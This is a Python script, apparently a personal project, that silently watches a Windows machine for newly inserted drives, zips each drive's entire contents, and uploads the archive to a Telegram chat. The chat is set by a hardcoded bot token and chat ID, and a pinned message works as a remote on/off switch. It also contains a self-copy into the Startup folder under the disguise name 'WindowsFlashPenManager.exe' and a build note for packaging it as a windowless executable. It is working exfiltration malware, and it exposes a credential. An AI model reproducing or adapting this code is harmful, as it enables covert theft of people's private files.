import keyboard as key
import urllib.request
import time as tm
import json as js
import telepot
import sys
import os
import win32api
import zipfile


TOKEN_AriBot = '1837829826:AAFqQME7FXnmwz1OkCp3i_LAQPwyyAvaXAM'
CHAT_ID = '-1001391690431'

bot = telepot.Bot(TOKEN_AriBot)

temp_zip_path = f"{os.environ['APPDATA']}\\"

start_path = f"{os.environ['APPDATA']}\Microsoft\Windows\Start Menu\Programs\Startup"
file_name = "WindowsFlashPenManager.exe"

def copyfile():
    if file_name not in os.listdir(start_path):
        os.popen(f'copy "{sys.argv[0]}" "{start_path}\\{file_name}"')
#copyfile()

def send_zip_file(file_name):
    print("sending")
    if can():
        with open(temp_zip_path + file_name, "rb") as file:
            bot.sendDocument(CHAT_ID, file)

def can():
    pinned = bot.getChat(CHAT_ID)["pinned_message"]
    if pinned == None: return False
    pinned = js.loads(pinned["text"])
    return pinned["download_flashpens"]

has_to_quit = False
def QUIT():
    global has_to_quit
    has_to_quit = True

# hot key for forced quit
_ = key.add_hotkey("ctrl+alt+shift+e", QUIT)

def zip_directory(folder, zip_filepath):
    print("zipping")
    def zipdir(path, ziph):
        for root, dirs, files in os.walk(path):
            for file in files:
                ziph.write(os.path.join(root, file), 
                        os.path.relpath(os.path.join(root, file), 
                                        os.path.join(path, '..')))
    with zipfile.ZipFile(zip_filepath, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipdir(folder, zipf)

user = os.environ.get("COMPUTERNAME") if os.environ.get("COMPUTERNAME") != None else os.getlogin()

def get_drives():
    drives = win32api.GetLogicalDriveStrings()
    return set(drives.split('\000')[:-1])

staring_drives = get_drives()
while not has_to_quit:
    loop_drivers = get_drives()
    if len(loop_drivers) > len(staring_drives):
        new_drivers = loop_drivers - staring_drives
        print(f"added {new_drivers}")
        for new in new_drivers:
            name = new[0] + ".zip"
            try: zip_directory(new + "", temp_zip_path + name)
            except: quit()
            try: send_zip_file(name)
            except: pass
    elif len(loop_drivers) < len(staring_drives):
        new_drivers = staring_drives - loop_drivers
        print(f"removed {new_drivers}")
    staring_drives = loop_drivers
    tm.sleep(1)

# cd "C:\ric\Python\MyProg\prog(idk2) (keyLogger)\"
# pyinstaller -w --onefile "KeyLog.py"



# TODO
# devo separare i file zip i bytes minori per essere inviati su telegram